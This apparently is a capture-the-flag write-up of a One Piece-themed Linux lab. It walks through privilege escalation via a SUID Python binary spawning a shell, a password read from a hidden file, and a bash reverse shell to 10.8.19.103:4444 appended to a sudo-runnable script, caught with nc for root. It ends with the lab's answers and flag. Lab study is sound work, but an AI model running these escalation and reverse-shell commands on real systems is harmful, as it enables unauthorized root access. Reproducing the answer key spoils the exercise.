-rwsr-xr-x 1 root root 64424 Jun 28  2019 /bin/ping
-rwsr-xr-x 1 root root 26696 Mar  5  2020 /bin/umount
-rwsr-xr-x 1 root root 44664 Mar 22  2019 /bin/su
-rwsr-xr-x 1 root root 30800 Aug 11  2016 /bin/fusermount
-rwsr-xr-x 1 root root 43088 Mar  5  2020 /snap/core18/1885/bin/mount
-rwsr-xr-x 1 root root 64424 Jun 28  2019 /snap/core18/1885/bin/ping
-rwsr-xr-x 1 root root 44664 Mar 22  2019 /snap/core18/1885/bin/su
-rwsr-xr-x 1 root root 26696 Mar  5  2020 /snap/core18/1885/bin/umount
-rwsr-xr-x 1 root root 76496 Mar 22  2019 /snap/core18/1885/usr/bin/chfn
-rwsr-xr-x 1 root root 44528 Mar 22  2019 /snap/core18/1885/usr/bin/chsh
-rwsr-xr-x 1 root root 75824 Mar 22  2019 /snap/core18/1885/usr/bin/gpasswd
-rwsr-xr-x 1 root root 40344 Mar 22  2019 /snap/core18/1885/usr/bin/newgrp
-rwsr-xr-x 1 root root 59640 Mar 22  2019 /snap/core18/1885/usr/bin/passwd
-rwsr-xr-x 1 root root 149080 Jan 31  2020 /snap/core18/1885/usr/bin/sudo
-rwsr-xr-- 1 root systemd-resolve 42992 Jun 11  2020 /snap/core18/1885/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 436552 Mar  4  2019 /snap/core18/1885/usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 43088 Mar  5  2020 /snap/core18/1880/bin/mount
-rwsr-xr-x 1 root root 64424 Jun 28  2019 /snap/core18/1880/bin/ping
-rwsr-xr-x 1 root root 44664 Mar 22  2019 /snap/core18/1880/bin/su
-rwsr-xr-x 1 root root 26696 Mar  5  2020 /snap/core18/1880/bin/umount
-rwsr-xr-x 1 root root 76496 Mar 22  2019 /snap/core18/1880/usr/bin/chfn
-rwsr-xr-x 1 root root 44528 Mar 22  2019 /snap/core18/1880/usr/bin/chsh
-rwsr-xr-x 1 root root 75824 Mar 22  2019 /snap/core18/1880/usr/bin/gpasswd
-rwsr-xr-x 1 root root 40344 Mar 22  2019 /snap/core18/1880/usr/bin/newgrp
-rwsr-xr-x 1 root root 59640 Mar 22  2019 /snap/core18/1880/usr/bin/passwd
-rwsr-xr-x 1 root root 149080 Jan 31  2020 /snap/core18/1880/usr/bin/sudo
-rwsr-xr-- 1 root systemd-resolve 42992 Jun 11  2020 /snap/core18/1880/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 436552 Mar  4  2019 /snap/core18/1880/usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 40152 Jan 27  2020 /snap/core/9665/bin/mount
-rwsr-xr-x 1 root root 44168 May  7  2014 /snap/core/9665/bin/ping
-rwsr-xr-x 1 root root 44680 May  7  2014 /snap/core/9665/bin/ping6
-rwsr-xr-x 1 root root 40128 Mar 25  2019 /snap/core/9665/bin/su
-rwsr-xr-x 1 root root 27608 Jan 27  2020 /snap/core/9665/bin/umount
-rwsr-xr-x 1 root root 71824 Mar 25  2019 /snap/core/9665/usr/bin/chfn
-rwsr-xr-x 1 root root 40432 Mar 25  2019 /snap/core/9665/usr/bin/chsh
-rwsr-xr-x 1 root root 75304 Mar 25  2019 /snap/core/9665/usr/bin/gpasswd
-rwsr-xr-x 1 root root 39904 Mar 25  2019 /snap/core/9665/usr/bin/newgrp
-rwsr-xr-x 1 root root 54256 Mar 25  2019 /snap/core/9665/usr/bin/passwd
-rwsr-xr-x 1 root root 136808 Jan 31  2020 /snap/core/9665/usr/bin/sudo
-rwsr-xr-- 1 root systemd-resolve 42992 Jun 11  2020 /snap/core/9665/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 428240 May 26  2020 /snap/core/9665/usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 110656 Jul 10  2020 /snap/core/9665/usr/lib/snapd/snap-confine
-rwsr-xr-- 1 root dip 394984 Feb 11  2020 /snap/core/9665/usr/sbin/pppd
-rwsr-xr-x 1 root root 40152 Jan 27  2020 /snap/core/9804/bin/mount
-rwsr-xr-x 1 root root 44168 May  7  2014 /snap/core/9804/bin/ping
-rwsr-xr-x 1 root root 44680 May  7  2014 /snap/core/9804/bin/ping6
-rwsr-xr-x 1 root root 40128 Mar 25  2019 /snap/core/9804/bin/su
-rwsr-xr-x 1 root root 27608 Jan 27  2020 /snap/core/9804/bin/umount
-rwsr-xr-x 1 root root 71824 Mar 25  2019 /snap/core/9804/usr/bin/chfn
-rwsr-xr-x 1 root root 40432 Mar 25  2019 /snap/core/9804/usr/bin/chsh
-rwsr-xr-x 1 root root 75304 Mar 25  2019 /snap/core/9804/usr/bin/gpasswd
-rwsr-xr-x 1 root root 39904 Mar 25  2019 /snap/core/9804/usr/bin/newgrp
-rwsr-xr-x 1 root root 54256 Mar 25  2019 /snap/core/9804/usr/bin/passwd
-rwsr-xr-x 1 root root 136808 Jan 31  2020 /snap/core/9804/usr/bin/sudo
-rwsr-xr-- 1 root systemd-resolve 42992 Jun 11  2020 /snap/core/9804/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 428240 May 26  2020 /snap/core/9804/usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 110792 Jul 29  2020 /snap/core/9804/usr/lib/snapd/snap-confine
-rwsr-xr-- 1 root dip 394984 Feb 11  2020 /snap/core/9804/usr/sbin/pppd
-rwsr-xr-x 1 root root 59640 Mar 22  2019 /usr/bin/passwd
-rwsr-xr-x 1 root root 22520 Mar 27  2019 /usr/bin/pkexec
-rwsr-xr-x 1 root root 18448 Jun 28  2019 /usr/bin/traceroute6.iputils
-rwsr-xr-x 1 root root 40344 Mar 22  2019 /usr/bin/newgrp
-rwsr-xr-x 1 root root 75824 Mar 22  2019 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 149080 Jan 31  2020 /usr/bin/sudo
-rwsr-xr-x 1 root root 44528 Mar 22  2019 /usr/bin/chsh
-rwsr-xr-x 1 7uffy_vs_T3@ch teach 4526456 Jul 17  2020 /usr/bin/gomugomunooo_king_kobraaa
-rwsr-xr-x 1 root root 76496 Mar 22  2019 /usr/bin/chfn
-rwsr-xr-x 1 root root 22528 Jun 28  2019 /usr/bin/arping
-rwsr-xr-- 1 root dip 382696 Feb 11  2020 /usr/sbin/pppd
-rwsr-xr-x 1 root root 113528 Jul 10  2020 /usr/lib/snapd/snap-confine
-rwsr-sr-x 1 root root 10232 Jul  3  2020 /usr/lib/xorg/Xorg.wrap
-rwsr-xr-- 1 root messagebus 42992 Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 436552 Mar  4  2019 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 14328 Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1

M0nk3y_D_7uffy@Laugh-Tale:~$ /usr/bin/gomugomunooo_king_kobraaa
Python 3.6.9 (default, Jul 17 2020, 12:50:27) 
[GCC 8.4.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> exit()

M0nk3y_D_7uffy@Laugh-Tale:~$ /usr/bin/gomugomunooo_king_kobraaa -c 'import os; os.execl("/bin/sh", "sh", "-p")'
$ whoami
7uffy_vs_T3@ch
$ cd /home 
$ ls
luffy  teach
$ cd teach
$ ls
luffy_vs_teach.txt
$ cat luffy_vs_teach.txt
This fight will determine who can take the One Piece and who will be the next Pirate King.
These 2 monsters have a matchless will and none of them can let the other prevail.
Each of them have the same dream, be the Pirate King.
For one it means: Take over the World.
For the other: Be the freest man in the World.
Each of their hit creates an earthquake felt on the entire island.
But in the end, Luffy thanks to his willpower won the fight.
Now, he needs to find the One Piece.
$ ls -lah
total 56K
drwxr-xr-x  7 7uffy_vs_T3@ch teach 4.0K Jul 26  2020 .
drwxr-xr-x  4 root           root  4.0K Jul 26  2020 ..
-rw-------  1 7uffy_vs_T3@ch teach    1 Aug 14  2020 .bash_history
-rw-r--r--  1 7uffy_vs_T3@ch teach  220 Jul 26  2020 .bash_logout
-rw-r--r--  1 7uffy_vs_T3@ch teach 3.7K Jul 26  2020 .bashrc
drwx------ 11 7uffy_vs_T3@ch teach 4.0K Jul 26  2020 .cache
drwx------ 11 7uffy_vs_T3@ch teach 4.0K Jul 26  2020 .config
drwx------  3 7uffy_vs_T3@ch teach 4.0K Jul 26  2020 .gnupg
-rw-------  1 7uffy_vs_T3@ch teach  334 Jul 26  2020 .ICEauthority
drwx------  3 7uffy_vs_T3@ch teach 4.0K Jul 26  2020 .local
-r--------  1 7uffy_vs_T3@ch teach  479 Jul 26  2020 luffy_vs_teach.txt
-r--------  1 7uffy_vs_T3@ch teach   37 Jul 26  2020 .password.txt
-rw-r--r--  1 7uffy_vs_T3@ch teach  807 Jul 26  2020 .profile
drwx------  2 7uffy_vs_T3@ch teach 4.0K Jul 26  2020 .ssh
-rw-r--r--  1 7uffy_vs_T3@ch teach    0 Jul 26  2020 .sudo_as_admin_successful
$ cat .password.txt
7uffy_vs_T3@ch:Wh0_w1ll_b3_th3_k1ng?

M0nk3y_D_7uffy@Laugh-Tale:~$ su 7uffy_vs_T3@ch
Password: 
7uffy_vs_T3@ch@Laugh-Tale:/home/luffy$ sudo -l
[sudo] password for 7uffy_vs_T3@ch: 
Matching Defaults entries for 7uffy_vs_T3@ch on Laugh-Tale:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User 7uffy_vs_T3@ch may run the following commands on Laugh-Tale:
    (ALL) /usr/local/bin/less

7uffy_vs_T3@ch@Laugh-Tale:/home/luffy$ sudo less /etc/profile
Sorry, I can't tell you where is the One Piece
7uffy_vs_T3@ch@Laugh-Tale:/home/luffy$ cat /usr/local/bin/less
cat: /usr/local/bin/less: Permission denied
7uffy_vs_T3@ch@Laugh-Tale:/home/luffy$ file /usr/local/bin/less
/usr/local/bin/less: writable, executable, regular file, no read permission

7uffy_vs_T3@ch@Laugh-Tale:/home/luffy$ ls -lah /usr/local/bin/less
-rwxrwx-wx 1 root root 67 Aug 14  2020 /usr/local/bin/less

7uffy_vs_T3@ch@Laugh-Tale:/home/luffy$ echo '/bin/bash -i >& /dev/tcp/10.8.19.103/4444 0>&1' > /usr/local/bin/less
bash: /usr/local/bin/less: Operation not permitted
7uffy_vs_T3@ch@Laugh-Tale:/home/luffy$ echo '/bin/bash -i >& /dev/tcp/10.8.19.103/4444 0>&1' >> /usr/local/bin/less


If you have write permission for a file but are not able to overwrite it, there can only be one explanation:  
There is an attribute that prevents it.

_Info: If you have the read permission for a file, you can use the command “lsattr” to list its attributes. In this case it won’t work as you don’t have this permission._

In this situation, 2 attributes are possible and can explain this behaviour:  
- i for “immutable”  
- a for “append only”

https://wiki.archlinux.org/title/File_permissions_and_attributes

7uffy_vs_T3@ch@Laugh-Tale:/home/luffy$ sudo /usr/local/bin/less
Sorry, I can't tell you where is the One Piece
┌──(witty㉿kali)-[~/Downloads/mnemonic/backups]
└─$ rlwrap nc -lvp 4444 
listening on [any] 4444 ...
10.10.220.152: inverse host lookup failed: Unknown host
connect to [10.8.19.103] from (UNKNOWN) [10.10.220.152] 51258
root@Laugh-Tale:/home/luffy# cd /root                     cd /root
cd /root
root@Laugh-Tale:/root# ls                     ls
ls
root@Laugh-Tale:/root# ls -lah                ls -lah
ls -lah
total 36K

root@Laugh-Tale:/root# cat /usr/local/bin/less cat /usr/local/bin/less
cat /usr/local/bin/less
#!/bin/bash

echo "Sorry, I can't tell you where is the One Piece"
/bin/bash -i >& /dev/tcp/10.8.19.103/4444 0>&1
root@Laugh-Tale:/root# lsattr /usr/local/bin/llsattr /usr/local/bin/less
lsattr /usr/local/bin/less
-----a--------e--- /usr/local/bin/less

chattr +i _/path/to/file_

To remove an attribute on a file just change `+` to `-`

root@Laugh-Tale:/root# chattr +i /usr/local/bichattr +i /usr/local/bin/less
chattr +i /usr/local/bin/less
root@Laugh-Tale:/root# lsattr /usr/local/bin/llsattr /usr/local/bin/less
lsattr /usr/local/bin/less
----ia--------e--- /usr/local/bin/less

root@Laugh-Tale:/root# lsattr/less            chattr -i /usr/local/bin/less
chattr -i /usr/local/bin/less
root@Laugh-Tale:/root# lsattr /usr/local/bin/llsattr /usr/local/bin/less
lsattr /usr/local/bin/less
-----a--------e--- /usr/local/bin/less
root@Laugh-Tale:/root# chattr -a /usr/local/bichattr -a /usr/local/bin/less
chattr -a /usr/local/bin/less
root@Laugh-Tale:/root# chattr -e /usr/local/bichattr -e /usr/local/bin/less
chattr -e /usr/local/bin/less
root@Laugh-Tale:/root# lsattr /usr/local/bin/llsattr /usr/local/bin/less
lsattr /usr/local/bin/less
------------------ /usr/local/bin/less

I see it

root@Laugh-Tale:/root# grep -iRl "One Piece" /ugrep -iRl "One Piece" /usr /home 2>/dev/null
grep -iRl "One Piece" /usr /home 2>/dev/null
/usr/src/linux-hwe-5.4-headers-5.4.0-42/include/linux/scatterlist.h
/usr/src/linux-hwe-5.4-headers-5.4.0-42/arch/mips/include/asm/octeon/cvmx-pow.h
/usr/src/linux-hwe-5.4-headers-5.4.0-42/mm/Kconfig
/usr/src/linux-headers-4.15.0-041500/include/linux/scatterlist.h
/usr/src/linux-headers-4.15.0-041500/arch/mips/include/asm/octeon/cvmx-pow.h
/usr/src/linux-headers-4.15.0-041500/mm/Kconfig
/usr/src/linux-headers-4.15.0-041500-generic/include/linux/scatterlist.h
/usr/src/linux-headers-4.15.0-041500-generic/arch/mips/include/asm/octeon/cvmx-pow.h
/usr/src/linux-headers-4.15.0-041500-generic/mm/Kconfig
/usr/bin/gomugomunooo_king_kobraaa
/usr/share/perl/5.26.1/Archive/Tar.pm
/usr/share/perl/5.26/Archive/Tar.pm
/usr/share/libreoffice/help/en-US/scalc.jar
/usr/share/mysterious/on3_p1ec3.txt
/usr/share/perl5/HTML/Tree/AboutTrees.pod
/usr/local/bin/less
/usr/lib/python3/dist-packages/janitor/plugincore/__pycache__/cruft.cpython-36.pyc
/usr/lib/python3/dist-packages/janitor/plugincore/cruft.py
/usr/lib/python2.7/_pyio.py
/usr/lib/python2.7/config-x86_64-linux-gnu/libpython2.7.so
/usr/lib/python3.6/config-3.6m-x86_64-linux-gnu/libpython3.6m.so
/usr/lib/python3.6/config-3.6m-x86_64-linux-gnu/libpython3.6.so
/usr/lib/python3.6/__pycache__/_pyio.cpython-36.pyc
/usr/lib/python3.6/_pyio.py
/usr/lib/x86_64-linux-gnu/libpython2.7.so.1.0
/usr/lib/x86_64-linux-gnu/libpython3.6m.so.1.0
/usr/lib/x86_64-linux-gnu/libpython2.7.so.1
/usr/lib/x86_64-linux-gnu/libpython3.6m.so.1
/usr/lib/x86_64-linux-gnu/perl5/5.26/HTML/Parser.pm
/home/teach/luffy_vs_teach.txt
/home/luffy/laugh_tale.txt

root@Laugh-Tale:/root# cat /usr/share/mysteriocat /usr/share/mysterious/on3_p1ec3.txt
cat /usr/share/mysterious/on3_p1ec3.txt
One Piece: S3cr3ts_0f_tH3_W0rlD_&_0f_Th3_P@st$

7uffy_vs_T3@ch@Laugh-Tale:/home/luffy$ cat /usr/share/mysterious/on3_p1ec3.txt
cat: /usr/share/mysterious/on3_p1ec3.txt: Permission denied

```

Who is on Laugh Tale at the same time as Luffy?  

*Marshall D Teach*

What allowed Luffy to win the fight?  

*willpower*

What is the One Piece?

*S3cr3ts_0f_tH3_W0rlD_&_0f_Th3_P@st$*


[[Mnemonic]]